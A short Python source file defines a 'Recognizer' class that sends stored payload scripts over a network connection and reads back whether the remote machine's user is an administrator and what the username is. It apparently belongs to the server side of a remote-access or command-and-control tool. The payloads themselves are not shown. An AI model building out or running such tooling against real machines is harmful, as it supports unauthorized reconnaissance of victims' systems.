from dataManager.repository.userRepository import UserRepository
import logging
import ast

class Recognizer:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "recognizer"
        self.user_repository: UserRepository = user_repository

    async def check_is_admin(self, reader, writer):
        with open("./modules/payloads/payload_check_is_admin.py", "rb") as f:
            writer.write(f.read())
            await writer.drain()
            data = await reader.read(4096)
            message = data.decode()
            return False if message.startswith("0") else True
        
    async def get_username(self, reader, writer) -> dict:
        with open("./modules/payloads/payload_get_username.py", "rb") as f:
            writer.write(f.read())
            await writer.drain()
            data = await reader.read(4096)
            message = data.decode()
            return ast.literal_eval(message)
        

